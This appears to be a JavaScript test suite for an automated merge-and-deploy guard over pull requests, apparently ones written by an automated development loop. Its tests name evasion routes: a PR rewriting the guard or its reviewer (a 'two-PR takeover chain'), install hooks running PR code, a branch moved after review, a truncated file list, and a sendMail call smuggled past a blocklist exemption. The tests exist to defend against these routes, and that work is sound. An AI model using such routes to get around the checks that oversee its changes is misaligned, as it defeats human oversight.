  assert.match(call[2], /deploymentRollback/);
  assert.equal(call[3], "--variables");
  assert.deepEqual(JSON.parse(call[4]), { id: "dep-prev" });
});


test("createGuardDeps never asks `railway redeploy` to target a deployment id", async () => {
  const commands = [];
  const deps = createGuardDeps({
    gh: () => "{}",
    exec: (file, args) => {
      commands.push([file, ...args]);
      return "{}";
    },
    fetch: async () => ({ ok: true, json: async () => ({ ok: true }) }),
  });
  await deps.triggerRedeploy();
  const call = commands.find((entry) => entry[0] === "railway" && entry[1] === "redeploy");
  assert.ok(call);
  assert.ok(call.includes("--yes"));
  assert.equal(call.some((argument) => /^dep-/.test(String(argument))), false);
});


test("createGuardDeps waits out GitHub's lazily computed UNKNOWN mergeability", async () => {
  const answers = [
    JSON.stringify(loopPullRequest({ mergeable: "UNKNOWN" })),
    JSON.stringify(loopPullRequest({ mergeable: "UNKNOWN" })),
    JSON.stringify(loopPullRequest({ mergeable: "MERGEABLE" })),
  ];
  let slept = 0;
  const deps = createGuardDeps({
    gh: () => answers.shift(),
    exec: () => "{}",
    fetch: async () => ({ ok: true, json: async () => ({ ok: true }) }),
    sleep: async () => { slept += 1; },
  });
  const pr = await deps.getPullRequest(1094);
  assert.equal(pr.mergeable, "MERGEABLE");
  assert.equal(slept, 2);
});


test("createGuardDeps gives up on UNKNOWN mergeability instead of inventing an answer", async () => {
  const deps = createGuardDeps({
    gh: () => JSON.stringify(loopPullRequest({ mergeable: "UNKNOWN" })),
    exec: () => "{}",
    fetch: async () => ({ ok: true, json: async () => ({ ok: true }) }),
    sleep: async () => {},
  });
  const pr = await deps.getPullRequest(1094);
  assert.equal(pr.mergeable, "UNKNOWN");
  assert.equal(evaluateEligibility(pr).ok, false);
});


test("createGuardDeps runs the full suite and the evals in a throwaway worktree", async () => {
  const commands = [];
  const deps = createGuardDeps({
    gh: () => "{}",
    exec: (file, args) => {
      commands.push(`${file} ${args.join(" ")}`);
      return "";
    },
    fetch: async () => ({ ok: true, json: async () => ({ ok: true }) }),
  });
  const result = await deps.runTests({ headOid: HEAD_OID, headRefName: "feature/lm-dev-1090" });
  assert.equal(result.ok, true);
  assert.ok(commands.some((entry) => /^git worktree add/.test(entry)));
  assert.ok(commands.some((entry) => entry === "npm test"));
  assert.ok(commands.some((entry) => entry === "npm run eval"));
  assert.ok(commands.some((entry) => /^git worktree remove/.test(entry)));

  // `npm ci` without this flag runs the PR's own install hooks before a single test does, which
  // hands arbitrary code execution to the diff. It buys one class of safety, not all of them.
  const install = commands.find((entry) => /^npm ci/.test(entry));
  assert.ok(install, "the throwaway worktree must install dependencies");
  assert.match(install, /--ignore-scripts/);
});


// ---------------------------------------------------------------------------------------------
// Review findings — a guard that can be edited by the PRs it guards is not a guard.
// ---------------------------------------------------------------------------------------------

const REPO_ROOT = path.resolve(__dirname, "../../..");
const sha256Hex = (text) => crypto.createHash("sha256").update(text).digest("hex");


test("the guard's own files are denied outright, so it cannot be edited by what it guards", () => {
  for (const file of [
    "apps/life-manager/lib/dev-merge-guard.js",
    "apps/life-manager/lib/dev-merge-guard.test.js",
    "apps/life-manager/lib/dev-merge-guard-runtime.test.js",
    "apps/life-manager/scripts/dev-merge-guard.js",
  ]) {
    const verdict = classifyChangedPath(file);
    assert.equal(verdict.allowed, false, file);
    assert.equal(verdict.rule, "deny:guard-self", file);
  }
});


test("whatever --review-cmd resolves to is protected too, killing the two-PR takeover chain", () => {
  const protectedPaths = ["apps/life-manager/scripts/fresh-adversary.js"];
  const verdict = classifyChangedPath("apps/life-manager/scripts/fresh-adversary.js", { protectedPaths });
  assert.equal(verdict.allowed, false);
  assert.equal(verdict.rule, "deny:guard-self");
  // Without the runtime protection that same file is an ordinary allowlisted script — which is
  // exactly the hole: PR 1 rewrites the reviewer, PR 2 sails through the reviewer it wrote.
  assert.equal(classifyChangedPath("apps/life-manager/scripts/fresh-adversary.js").allowed, true);
});


test("the review command's own file is discovered by realpath, not by string matching", () => {
  const found = resolveReviewCommandPaths(
    "node apps/life-manager/scripts/dev-merge-guard.js --pr 1",
    { repoDir: REPO_ROOT },
  );
  assert.deepEqual(found, ["apps/life-manager/scripts/dev-merge-guard.js"]);
  assert.deepEqual(resolveReviewCommandPaths("/usr/bin/true", { repoDir: REPO_ROOT }), []);
});


test("a PR that touches the guard stops at eligibility before anything of it runs", async () => {
  const ledgerPath = tempLedger();
  const deps = stubDeps({
    ledgerPath,
    pr: { files: [{ path: "apps/life-manager/lib/dev-merge-guard.js" }] },
    changedFiles: ["apps/life-manager/lib/dev-merge-guard.js"],
  });
  const result = await runMergeGuard({ prNumber: 1094, deps });
  assert.equal(result.stoppedAtStage, "eligibility");
  assert.ok(result.stopReason.includes("path_allowlist"));
  assert.equal(deps.calls.merge, 0);
  const [row] = readLedger(ledgerPath);
  const stage = row.stages.find((entry) => entry.stage === "eligibility");
  assert.deepEqual(stage.evidence.denied_paths, [
    { path: "apps/life-manager/lib/dev-merge-guard.js", rule: "deny:guard-self" },
  ]);
});


test("a PR that rewrites the configured reviewer stops at eligibility too", async () => {
  const deps = stubDeps({
    ledgerPath: tempLedger(),
    pr: { files: [{ path: "apps/life-manager/scripts/fresh-adversary.js" }] },
    changedFiles: ["apps/life-manager/scripts/fresh-adversary.js"],
  });
  const result = await runMergeGuard({
    prNumber: 1094,
    deps,
    options: { protectedPaths: ["apps/life-manager/scripts/fresh-adversary.js"] },
  });
  assert.equal(result.stoppedAtStage, "eligibility");
  assert.equal(deps.calls.merge, 0);
});


test("a package.json unreadable at EITHER ref is refused, never treated as empty", async () => {
  for (const missing of ["base", "head"]) {
    const deps = stubDeps({
      ledgerPath: tempLedger(),
      pr: { files: [{ path: "apps/life-manager/package.json" }] },
      changedFiles: ["apps/life-manager/package.json"],
      deps: {
        readFileAtRef: async ({ ref }) => (
          (missing === "base") === (ref === "main")
            ? null
            : JSON.stringify({ dependencies: { pg: "8.22.0" } })
        ),
      },
    });
    const result = await runMergeGuard({ prNumber: 1094, deps });
    assert.equal(result.stoppedAtStage, "eligibility", missing);
    assert.ok(result.stopReason.includes("package_json:unreadable"), `${missing}: ${result.stopReason}`);
    assert.equal(deps.calls.merge, 0, missing);
  }
});


test("a rollback mutation that answers false falls back to a revert PR", async () => {
  const ledgerPath = tempLedger();
  const deps = stubDeps({
    ledgerPath,
    deps: {
      checkHealth: async () => false,
      rollback: async () => ({ ok: false, raw: "{\"data\":{\"deploymentRollback\":false}}" }),
    },
  });
  const result = await runMergeGuard({
    prNumber: 1094,
    deps,
    options: { healthTimeoutMs: 2000, healthIntervalMs: 1000 },
  });
  assert.equal(deps.calls.revertPr, 1, "a refused platform rollback must still produce a remedy");
  assert.equal(result.rollback.method, "revert_pr");
  assert.equal(result.rollback.railway_rollback_ok, false);
  assert.equal(result.rollback.ok, true);
  assert.equal(result.verdict, "rolled_back");
  const [row] = readLedger(ledgerPath);
  assert.equal(row.rollback.railway_rollback_ok, false);
});


test("a rollback that fails every available way is recorded as rollback_failed, not rolled_back", async () => {
  const ledgerPath = tempLedger();
  const deps = stubDeps({
    ledgerPath,
    deps: {
      checkHealth: async () => false,
      rollback: async () => ({ ok: false, raw: "boom" }),
      openRevertPr: async () => ({ url: null, error: "push rejected" }),
    },
  });
  const result = await runMergeGuard({
    prNumber: 1094,
    deps,
    options: { healthTimeoutMs: 2000, healthIntervalMs: 1000 },
  });
  assert.equal(result.verdict, "rollback_failed");
  assert.equal(result.rollback.ok, false);
  const [row] = readLedger(ledgerPath);
  assert.equal(row.verdict, "rollback_failed");
  assert.ok(deps.calls.alerts.length >= 1);
});


test("a throw after the merge still leaves an honest ledger row behind", async () => {
  const ledgerPath = tempLedger();
  const deps = stubDeps({
    ledgerPath,
    deps: { triggerRedeploy: async () => { throw new Error("railway CLI exploded"); } },
  });
  const result = await runMergeGuard({ prNumber: 1094, deps });

  assert.equal(result.mergeSha, "b".repeat(40));
  assert.equal(result.verdict, "merged_unverified");
  const rows = readLedger(ledgerPath);
  assert.equal(rows.length, 1, "a merged PR must never go unrecorded");
  assert.equal(rows[0].merge_sha, "b".repeat(40));
  assert.match(rows[0].post_merge_error, /railway CLI exploded/);
  assert.ok(deps.calls.alerts.some((message) => /railway CLI exploded/.test(message)));
});


test("git's file list is authoritative, so a truncated gh list cannot hide a denied path", async () => {
  const ledgerPath = tempLedger();
  const deps = stubDeps({
    ledgerPath,
    pr: { files: [{ path: "apps/life-manager/lib/a.js" }] },
    changedFiles: ["apps/life-manager/lib/a.js", ".github/workflows/deploy.yml"],
  });
  const result = await runMergeGuard({ prNumber: 1094, deps });
  assert.equal(result.stoppedAtStage, "eligibility");
  const [row] = readLedger(ledgerPath);
  const stage = row.stages.find((entry) => entry.stage === "eligibility");
  assert.deepEqual(stage.evidence.denied_paths, [
    { path: ".github/workflows/deploy.yml", rule: "deny:workflow" },
  ]);
  assert.deepEqual(stage.evidence.files_cross_check.git_only, [".github/workflows/deploy.yml"]);
});


test("a rename is judged on both its old and its new path", () => {
  assert.deepEqual(
    parseNameStatus([
      "M\tapps/life-manager/lib/a.js",
      "R096\tapps/life-manager/lib/old.js\tapps/life-manager/lib/new.js",
      "A\tapps/life-manager/lib/b.js",
      "R100\tapps/life-manager/lib/moved.js\tskills/earn/moved.js",
    ].join("\n")),
    [
      "apps/life-manager/lib/a.js",
      "apps/life-manager/lib/old.js",
      "apps/life-manager/lib/new.js",
      "apps/life-manager/lib/b.js",
      "apps/life-manager/lib/moved.js",
      "skills/earn/moved.js",
    ],
  );
  const verdict = evaluateEligibility(loopPullRequest(), {
    changedFiles: ["apps/life-manager/lib/moved.js", "skills/earn/moved.js"],
  });
  assert.equal(verdict.ok, false);
  assert.deepEqual(verdict.deniedPaths, [{ path: "skills/earn/moved.js", rule: "deny:skill" }]);
});


test("a git file list that cannot be read refuses instead of falling back to gh", async () => {
  const deps = stubDeps({
    ledgerPath: tempLedger(),
    deps: { listChangedFiles: async () => null },
  });
  const result = await runMergeGuard({ prNumber: 1094, deps });
  assert.equal(result.stoppedAtStage, "eligibility");
  assert.ok(result.stopReason.includes("changed_files_unreadable"));
  assert.equal(deps.calls.merge, 0);
});


test("the blocklist exemption is exact-path and declaration-line only", () => {
  const guard = "apps/life-manager/lib/dev-merge-guard.js";

  // A real call smuggled onto a line that merely *starts* like a pattern declaration.
  assert.deepEqual(
    detectBlockedActions([
      { path: guard, line: "  pattern: /nothing/, boot: await sendMail(user)," },
    ]).map((hit) => hit.action),
    ["outreach_send"],
  );

  // A look-alike path anywhere else in the tree is not the guard.
  assert.deepEqual(
    detectBlockedActions([
      { path: "vendor/lib/dev-merge-guard.js", line: "  pattern: /x/, boot: await sendMail(user)," },
    ]).map((hit) => hit.action),
    ["outreach_send"],
  );

  // A declaration line that is nothing but a declaration stays exempt.
  assert.deepEqual(
    detectBlockedActions([{ path: guard, line: "    pattern: /\\bsendMail\\s*\\(/," }]),
    [],
  );
});


test("ledger rows chain to one another, so a removed or edited row is evident", () => {
  const ledgerPath = tempLedger();
  const first = appendGuardRun(ledgerPath, { run_id: "r1", verdict: "stopped" });
  const second = appendGuardRun(ledgerPath, { run_id: "r2", verdict: "stopped" });

  assert.equal(first.prev, LEDGER_GENESIS);
  assert.match(first.record_hash, /^[a-f0-9]{64}$/);
  assert.equal(second.prev, sha256Hex(first.record_hash));
  assert.equal(verifyLedgerTail(ledgerPath).ok, true);

  const rows = readLedgerRows(ledgerPath);
  rows[0].verdict = "merged_deployed";
  fs.writeFileSync(ledgerPath, `${rows.map((row) => JSON.stringify(row)).join("\n")}\n`);
  const tampered = verifyLedgerTail(ledgerPath);
  assert.equal(tampered.ok, false);
  assert.ok(tampered.problems.length > 0);

  fs.writeFileSync(ledgerPath, `${JSON.stringify(rows[1])}\n`);
  assert.equal(verifyLedgerTail(ledgerPath).ok, false, "a deleted first row must not verify");
});


test("a run verifies the ledger tail before it starts and alerts when the chain is broken", async () => {
  const ledgerPath = tempLedger();
  appendGuardRun(ledgerPath, { run_id: "r1", verdict: "stopped" });
  const rows = readLedgerRows(ledgerPath);
  rows[0].verdict = "merged_deployed";
  fs.writeFileSync(ledgerPath, `${rows.map((row) => JSON.stringify(row)).join("\n")}\n`);

  const deps = stubDeps({ ledgerPath });
  const result = await runMergeGuard({ prNumber: 1094, deps });
  assert.equal(result.ledgerCheck.ok, false);
  assert.ok(deps.calls.alerts.some((message) => /ledger/i.test(message)));
  const written = readLedger(ledgerPath);
  assert.equal(written.at(-1).ledger_check.ok, false);
});


test("a second guard run refuses to start while another holds the lock", async () => {
  const ledgerPath = tempLedger();
  let release;
  const gate = new Promise((resolve) => { release = resolve; });
  const first = stubDeps({
    ledgerPath,
    deps: { review: async () => { await gate; return { verdict: "pass", findings: [] }; } },
  });
  const running = runMergeGuard({ prNumber: 1094, deps: first });

  const second = stubDeps({ ledgerPath });
  const blocked = await runMergeGuard({ prNumber: 1094, deps: second });
  assert.equal(blocked.verdict, "locked");
  assert.equal(second.calls.merge, 0);

  release();
  const done = await running;
  assert.equal(done.verdict, "merged_deployed");
  assert.equal(readLedger(ledgerPath).length, 1, "a locked-out run must not append a row");

  // The lock is released, so the next run gets in.
  const third = stubDeps({ ledgerPath });
  assert.equal((await runMergeGuard({ prNumber: 1094, deps: third })).verdict, "merged_deployed");
});


test("a lock left behind by a dead run goes stale after 30 minutes", () => {
  const ledgerPath = tempLedger();
  const lockPath = guardLockPath(ledgerPath);
  const t0 = Date.parse("2026-07-27T00:00:00.000Z");

  assert.equal(acquireGuardLock(lockPath, { now: () => new Date(t0), pid: 111 }).ok, true);
  assert.equal(
    acquireGuardLock(lockPath, { now: () => new Date(t0 + 29 * 60 * 1000), pid: 222 }).ok,
    false,
  );
  const stolen = acquireGuardLock(lockPath, { now: () => new Date(t0 + 31 * 60 * 1000), pid: 222 });
  assert.equal(stolen.ok, true);
  assert.equal(stolen.stolen.pid, 111);
  assert.equal(releaseGuardLock(lockPath, { pid: 222 }), true);
  assert.equal(fs.existsSync(lockPath), false);
});


test("alerts reach the admin Telegram chat, with stderr only as the fallback", async () => {
  const sent = [];
  const wired = createGuardDeps({
    gh: () => "{}",
    exec: () => "{}",
    fetch: async () => ({ ok: true, json: async () => ({ ok: true }) }),
    env: { LM_TELEGRAM_BOT_TOKEN: "bot-token", LM_ADMIN_TELEGRAM_CHAT_ID: "555" },
    sendMessage: async (token, chatId, text) => { sent.push({ token, chatId, text }); return { ok: true }; },
  });
  const delivered = await wired.alert("production is red");
  assert.equal(delivered.channel, "telegram");
  assert.equal(sent.length, 1);
  assert.equal(sent[0].token, "bot-token");
  assert.equal(sent[0].chatId, "555");
  assert.match(sent[0].text, /production is red/);

  const stderrChunks = [];
  const originalWrite = process.stderr.write;
  process.stderr.write = (chunk) => { stderrChunks.push(String(chunk)); return true; };
  let fallback;
  try {
    const bare = createGuardDeps({
      gh: () => "{}",
      exec: () => "{}",
      fetch: async () => ({ ok: true, json: async () => ({ ok: true }) }),
      env: {},
    });
    fallback = await bare.alert("no telegram configured");
  } finally {
    process.stderr.write = originalWrite;
  }
  assert.equal(fallback.channel, "stderr");
  assert.ok(stderrChunks.some((chunk) => chunk.includes("no telegram configured")));
});


test("the revert PR that awaits a human is announced on Telegram, not only on stderr", async () => {
  const sent = [];
  const wired = createGuardDeps({
    gh: () => "{}",
    exec: () => "{}",
    fetch: async () => ({ ok: true, json: async () => ({ ok: true }) }),
    env: { LM_TELEGRAM_BOT_TOKEN: "bot-token", LM_ADMIN_TELEGRAM_CHAT_ID: "555" },
    sendMessage: async (token, chatId, text) => { sent.push(text); return { ok: true }; },
  });
  const deps = stubDeps({
    ledgerPath: tempLedger(),
    deps: {
      checkHealth: async () => false,
      getPreviousSuccessfulDeployment: async () => ({
        id: "dep-prev", status: "SUCCESS", canRollback: false, commitHash: "c".repeat(40),
      }),
      alert: wired.alert,
    },
  });
  await runMergeGuard({
    prNumber: 1094,
    deps,
    options: { healthTimeoutMs: 2000, healthIntervalMs: 1000 },
  });
  assert.ok(sent.some((text) => /revert/i.test(text)), JSON.stringify(sent));
});


test("the reviewed diff is taken from the fetched head commit, not from a moving branch", async () => {
  const commands = [];
  const deps = createGuardDeps({
    gh: (args) => { commands.push(["gh", ...args]); return ""; },
    exec: (file, args) => { commands.push([file, ...args]); return "THE DIFF"; },
    fetch: async () => ({ ok: true, json: async () => ({ ok: true }) }),
  });
  const diff = await deps.getDiff({
    prNumber: 1094, base: "main", headOid: HEAD_OID, headRefName: "feature/lm-dev-1090",
  });
  assert.equal(diff, "THE DIFF");
  assert.equal(
    commands.some((entry) => entry[0] === "gh" && entry[1] === "pr" && entry[2] === "diff"),
    false,
    "`gh pr diff` follows the branch, which the author can move after review",
  );
  const git = commands.find((entry) => entry[0] === "git" && entry[1] === "diff");
  assert.ok(git, "the reviewed diff must come from `git diff`");
  assert.ok(git.some((argument) => String(argument).endsWith(`...${HEAD_OID}`)), git.join(" "));
});


test("createGuardDeps reads the changed-file list from git name-status at the head commit", async () => {
  const commands = [];
  const deps = createGuardDeps({
    gh: () => "",
    exec: (file, args) => {
      commands.push([file, ...args]);
      if (file === "git" && args[0] === "diff") {
        return "M\tapps/life-manager/lib/a.js\nR097\tapps/life-manager/lib/o.js\tapps/life-manager/lib/n.js\n";
      }
      return "";
    },
    fetch: async () => ({ ok: true, json: async () => ({ ok: true }) }),
  });
  const files = await deps.listChangedFiles({
    base: "main", headOid: HEAD_OID, headRefName: "feature/lm-dev-1090",
  });
  assert.deepEqual(files, [
    "apps/life-manager/lib/a.js",
    "apps/life-manager/lib/o.js",
    "apps/life-manager/lib/n.js",
  ]);
  const git = commands.find((entry) => entry[0] === "git" && entry[1] === "diff");
  assert.ok(git.includes("--name-status"));
  assert.ok(commands.some((entry) => entry[0] === "git" && entry[1] === "fetch"));
});
